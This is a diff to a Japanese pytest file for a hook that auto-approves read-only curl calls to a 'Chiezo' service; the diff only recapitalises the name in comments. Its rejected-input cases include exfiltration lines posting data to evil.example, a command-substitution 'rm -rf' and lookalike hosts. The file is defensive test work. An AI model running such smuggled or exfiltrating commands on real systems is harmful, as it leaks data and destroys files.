@@ -1,7 +1,7 @@
 """自動許可フック(app/hooks/chiezo_autoallow.py)の判定と、その配信の検査。
 
 フックの存在意義は「permissions.allow の前方一致では効かない形」を通すことなので、
-テストの主眼も (1) ループ・パイプに包まれた chiezo 読み取りが通ること、
+テストの主眼も (1) ループ・パイプに包まれた Chiezo 読み取りが通ること、
 (2) それに紛れ込ませた別ホスト・書き込み・任意コマンド実行が通らないこと、の 2 点。
 判定に迷ったら黙る(= 通常のプロンプトへ戻す)のが正なので、
 グレーな入力は「通らない」を期待値にしてよい。
@@ -29,7 +29,7 @@ def origin(monkeypatch):
 
 
 class TestAllowed:
-    """chiezo だけを読む形は、前方一致では拾えない形も含めて通る。"""
+    """Chiezo だけを読む形は、前方一致では拾えない形も含めて通る。"""
 
     @pytest.mark.parametrize(
         "command",
@@ -60,13 +60,13 @@ class TestRejected:
     @pytest.mark.parametrize(
         "command",
         [
-            # chiezo が出てこない = このフックの管轄外(通常のプロンプトへ)
+            # Chiezo が出てこない = このフックの管轄外(通常のプロンプトへ)
             "ls -la",
             'curl -s "https://example.com/api"',
-            # chiezo に紛れて別ホストを叩く
+            # Chiezo に紛れて別ホストを叩く
             f'curl -s "{ORIGIN}/v1/sources"; curl -s https://evil.example/exfil',
             f'curl -s "{ORIGIN}/v1/sources" | curl -s -d @- https://evil.example',
-            # ループの中身が chiezo 以外
+            # ループの中身が Chiezo 以外
             'for u in http://evil.example; do curl -s "$u"; done',
             # コマンド位置を隠す構文
             f'curl -s "{ORIGIN}/v1/sources" $(rm -rf /tmp/x)',
@@ -98,7 +98,7 @@ class TestRejected:
         assert hook.decide(command) is False
 
     def test_similar_host_is_not_chiezo(self):
-        """ホスト名の前方一致で通してはいけない(chiezo の netloc と完全一致が要る)。"""
+        """ホスト名の前方一致で通してはいけない(Chiezo の netloc と完全一致が要る)。"""
         assert hook.decide('curl -s "http://192.168.0.30:9000/v1/sources"') is False
         assert hook.decide('curl -s "http://192.168.0.3:9001/v1/sources"') is False
         assert hook.decide('curl -s "http://192.168.0.3:9000.evil.example/x"') is False
